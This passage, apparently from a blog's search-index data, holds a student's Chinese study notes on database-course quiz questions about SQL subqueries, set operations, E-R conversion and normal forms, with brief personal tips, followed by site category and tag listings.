Dname&#x3D;‘计算机’); B.Update Salary &#x3D; Salary * 1.1 Where D# in ( Select D# From Dept Where Dname &#x3D;‘计算机’); C.Update Salary &#x3D; Salary * 1.1 Where D# in (Select D# From Dept Where Dname &#x3D; 计算机); D.Update TABLE Teacher Set Salary &#x3D; Salary * 1.1 Where D# in ( Select D# From Dept Where Dname &#x3D; ‘计算机’); tips：UPDATE 后直接接表名 陈述A：SubQuery1 UNION SubQuery2语句，其中SubQuery1和SubQuery2查询中相应的列必须以同一顺序出现。 陈述B：GROUP BY和HAVING子句不能在子查询中使用，这些子句只能用在最后一个查询结束时来总结和排序最后结果集。 关于陈述A和B，下列说法正确的是_________。 A.陈述A正确，陈述B错误 B.都是正确的 C.都是错误的 D.陈述A错误，陈述B正确 tips：对于并的理解 在SQL中，与”NOT IN”等价的操作符是_________。 A.&lt;&gt; ALL B.&#x3D; SOME C.&lt;&gt; SOME D.&#x3D; ALL tip：？？？不理解 已知如下关系：学生Student(S#, Sname)，课程Course(C#, Cname, T#)，选课SC(S#, C#, Score)，教师T(T#, Tname)。其中S#为学号，Sname为学生命名，C#为课号，Cname为课程名，T#为教师编号，Score为成绩，Tname为教师名。阅读SQL语句 SELECT S# FROM SC WHERE Score&lt;60 GROUP BY C# HAVING Count(*)&gt;2； 关于其查询结果，下列说法正确的是_____。 A.有2人以上不及格课程的同学的学号 &#x2F;&#x2F; 有2人以上不及格的课程，学习该课程的同学的学号 B.有2门以上不及格课程的同学的学号 C.有2门以上及格课程的同学的学号 D.有2人以上及格课程的同学的学号 tips：傻逼题，自己理解 假设一个元组在子查询1中出现m次，在子查询2中出现n次，其中m&gt;0,n&gt;0, 则下列说法正确的是________。 A.该元组在“子查询1 Except 子查询2”中出现0次； B.该元组在“子查询1 Union 子查询2”中出现m + n次； C.该元组在 “子查询1 Except ALL 子查询2”中出现m – n次； D.该元组在“子查询1 Intersect 子查询2”中出现min(m,n)次； 假设一个元组在子查询1中出现m次，在子查询2中出现n次，其中m&gt;0,n&gt;0,则下列说法正确的是_________。 A.该元组在“子查询1 Union ALL 子查询2”中出现m + n次； B.该元组在 “子查询1 Union 子查询2”中出现m+n次； C.该元组在“子查询1 Union ALL 子查询2”中出现1次； D.该元组在 “子查询1 Union 子查询2”中出现Min(m,n)次； 假设一个元组在子查询1中出现m次，在子查询2中出现n次，其中m&gt;0,n&gt;0,则下列说法正确的是_________。 A.该元组在“子查询1 Except 子查询2”中出现0次； B.该元组在“子查询1 Union 子查询2”中出现m + n次； C.该元组在 “子查询1 Except All 子查询2”中出现m – n次； D.该元组在“子查询1 Union All 子查询2”中出现max(m,n)次； 有一个学生表student，包含主键S#（学生编号）等。又有分数表SC，包含S#（学生编号）、score（分数）等。已知student表中共有50个学生，有45人参加了考试（分数存在SC表中），其中10人不及格。执行以下SQL语句：select * from student where exists (select S# from SC where score&lt;60 )， 可返回_________条记录。 A.50 B.45 C.10 D.35 tips：因为这是非相关子查询，而且子查询始终为真(因为已知有10人不及格)，故检索出的是Student表中的所有记录。 难点：并、交 exists嵌套双重否定的理解 关于数据库设计，下列说法正确的是 。 A.若要开发一个信息系统，首先要确定使用哪一个DBMS来进行管理，然后才能进行数据库设计 B.概念数据库设计需要关注用E-R Diagram的思想来理解需求，而不能仅仅关注绘制E-R Diagram的图形 C.逻辑数据库设计的关注点是属性、结构和命名的冲突问题，数据库设计的规范性问题和DBMS的选型问题 D.物理数据库设计仅需要考虑数据量的大小、磁盘空间占用及存储结构等特性，但无关具体的DBMS tips：逻辑数据库不需要关注DBMS选型 若要将E-R图转换成关系模式，转换正确的是_________。 A.学生(学号，课程号，…)；课程(课程号，…) B.选修(学号，课程号，…) C.学生(学号，…)；课程 (课程号，学号，…..) D.学生(学号，…)；课程(课程号，…)；选修(学号，课程号，…) tips：多对多应新建一个关系作为练习 关于E-R 图向关系模式的转换的规则正确的是_________。 A.复合属性转换时只能将每个分量属性作为所在实体对应关系的属性 B.一对一联系的转换只能将联系定义为一个新的关系，再将属性设为参与双方的关键字属性 C.泛化实体与具体化实体在转换时，可以不要泛化实体，而仅将具体化实体转换成关系 D.一对多联系的转换，需将多方参与实体的关键字作为单方参与实体对应关系的属性 tips：D选项说反了，语文理解问题，自己体会。我也看不懂。反正是要把只有一个的那边的属性，加到有很多个个体的属性里面去。 一对多联系的转换，需将单方参与实体的关键字作为多方参与实体对应关系的属性。 如：商店（商店名，xxx）、商品（商品号，xxx，商店名）。1：N关系 下列由E-R图向关系模式转换具体实例中，明显不正确的是________。注意：关系模式中带下划线的属性为主键。 A. B. C. D. tips：注意D选项的已知 在关系模式R(U，F)中，如果F是最小函数依赖集，则____________。 A.R∈2NF B.R∈3NF C.R∈BCNF D.R的规范化程度与F是否最小函数依赖集无关。 tips：D 一般情况，企业会将从一个供应商处一次所进的多种货物办理一次入库，因此设计了关系模式：入库单(单号, 日期, 库房, 供应商，物品, 数量, 金额)，下列说法正确的是___ ______。 A.不满足第2范式 B.满足第2范式但不满足第3范式 C.满足第3范式 D.其他都不对 对设备管理，请分析关系模式：设备(设备编号, 设备名, 生产商编号，生产商名称，生产商地址，配件编号，配件名称，配件价格，设备价格)，说法正确的是_______________。 A.不满足第2范式 B.满足第2范式但不满足第3范式 C.满足第3范式 D.其他不对","categories":[{"name":"学习","slug":"学习","permalink":"https://blog.irec.moe/categories/%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"笔记","slug":"笔记","permalink":"https://blog.irec.moe/tags/%E7%AC%94%E8%AE%B0/"},{"name":"数据库","slug":"数据库","permalink":"https://blog.irec.moe/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"}]}],"categories":[{"name":"THM","slug":"THM","permalink":"https://blog.irec.moe/categories/THM/"},{"name":"网络","slug":"网络","permalink":"https://blog.irec.moe/categories/%E7%BD%91%E7%BB%9C/"},{"name":"硬件","slug":"硬件","permalink":"https://blog.irec.moe/categories/%E7%A1%AC%E4%BB%B6/"},{"name":"无线电","slug":"无线电","permalink":"https://blog.irec.moe/categories/%E6%97%A0%E7%BA%BF%E7%94%B5/"},{"name":"生活","slug":"生活","permalink":"https://blog.irec.moe/categories/%E7%94%9F%E6%B4%BB/"},{"name":"学习","slug":"学习","permalink":"https://blog.irec.moe/categories/%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"OpenVPN","slug":"OpenVPN","permalink":"https://blog.irec.moe/tags/OpenVPN/"},{"name":"机场","slug":"机场","permalink":"https://blog.irec.moe/tags/%E6%9C%BA%E5%9C%BA/"},{"name":"抓包","slug":"抓包","permalink":"https://blog.irec.moe/tags/%E6%8A%93%E5%8C%85/"},{"name":"Android","slug":"Android","permalink":"https://blog.irec.moe/tags/Android/"},{"name":"Windows","slug":"Windows","permalink":"https://blog.irec.moe/tags/Windows/"},{"name":"C#","slug":"C","permalink":"https://blog.irec.moe/tags/C/"},{"name":"Active Directory","slug":"Active-Directory","permalink":"https://blog.irec.moe/tags/Active-Directory/"},{"name":"WEB","slug":"WEB","permalink":"https://blog.irec.moe/tags/WEB/"},{"name":"栈","slug":"栈","permalink":"https://blog.irec.moe/tags/%E6%A0%88/"},{"name":"群晖","slug":"群晖","permalink":"https://blog.irec.moe/tags/%E7%BE%A4%E6%99%96/"},{"name":"硬盘","slug":"硬盘","permalink":"https://blog.irec.moe/tags/%E7%A1%AC%E7%9B%98/"},{"name":"灵车","slug":"灵车","permalink":"https://blog.irec.moe/tags/%E7%81%B5%E8%BD%A6/"},{"name":"短波","slug":"短波","permalink":"https://blog.irec.moe/tags/%E7%9F%AD%E6%B3%A2/"},{"name":"比赛","slug":"比赛","permalink":"https://blog.irec.moe/tags/%E6%AF%94%E8%B5%9B/"},{"name":"卫星","slug":"卫星","permalink":"https://blog.irec.moe/tags/%E5%8D%AB%E6%98%9F/"},{"name":"网卡","slug":"网卡","permalink":"https://blog.irec.moe/tags/%E7%BD%91%E5%8D%A1/"},{"name":"电池","slug":"电池","permalink":"https://blog.irec.moe/tags/%E7%94%B5%E6%B1%A0/"},{"name":"无线电","slug":"无线电","permalink":"https://blog.irec.moe/tags/%E6%97%A0%E7%BA%BF%E7%94%B5/"},{"name":"银行卡","slug":"银行卡","permalink":"https://blog.irec.moe/tags/%E9%93%B6%E8%A1%8C%E5%8D%A1/"},{"name":"羊毛","slug":"羊毛","permalink":"https://blog.irec.moe/tags/%E7%BE%8A%E6%AF%9B/"},{"name":"光猫","slug":"光猫","permalink":"https://blog.irec.moe/tags/%E5%85%89%E7%8C%AB/"},{"name":"VR","slug":"VR","permalink":"https://blog.irec.moe/tags/VR/"},{"name":"续命","slug":"续命","permalink":"https://blog.irec.moe/tags/%E7%BB%AD%E5%91%BD/"},{"name":"保健","slug":"保健","permalink":"https://blog.irec.moe/tags/%E4%BF%9D%E5%81%A5/"},{"name":"WireShark","slug":"WireShark","permalink":"https://blog.irec.moe/tags/WireShark/"},{"name":"经验","slug":"经验","permalink":"https://blog.irec.moe/tags/%E7%BB%8F%E9%AA%8C/"},{"name":"OpenWrt","slug":"OpenWrt","permalink":"https://blog.irec.moe/tags/OpenWrt/"},{"name":"WireGuard","slug":"WireGuard","permalink":"https://blog.irec.moe/tags/WireGuard/"},{"name":"OpenClash","slug":"OpenClash","permalink":"https://blog.irec.moe/tags/OpenClash/"},{"name":"PC","slug":"PC","permalink":"https://blog.irec.moe/tags/PC/"},{"name":"考试","slug":"考试","permalink":"https://blog.irec.moe/tags/%E8%80%83%E8%AF%95/"},{"name":"升学","slug":"升学","permalink":"https://blog.irec.moe/tags/%E5%8D%87%E5%AD%A6/"},{"name":"笔记","slug":"笔记","permalink":"https://blog.irec.moe/tags/%E7%AC%94%E8%AE%B0/"},{"name":"数据库","slug":"数据库","permalink":"https://blog.irec.moe/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"}]}